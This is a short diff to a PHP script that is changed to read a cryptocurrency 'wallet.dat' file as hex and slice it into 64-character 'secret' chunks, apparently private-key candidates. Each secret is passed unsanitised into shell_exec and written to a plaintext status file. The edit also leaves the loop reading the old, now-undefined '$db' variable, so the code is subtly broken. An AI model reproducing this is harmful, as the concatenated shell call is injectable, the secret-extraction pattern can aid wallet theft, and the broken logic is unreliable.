@@ -1,7 +1,7 @@
 <?php
-$db = file_get_contents("db.txt");
+$wallet = bin2hex(file_get_contents("wallet.dat"));;
 $addresses = file_get_contents("addresses.txt");
-$lenght = strlen($db);
+$lenght = strlen($wallet);
 	while($lenght > 64) {
 		$secret = substr($db, 0, 64);
 		shell_exec("echo ".$secret."   ".$lenght." > status.txt");
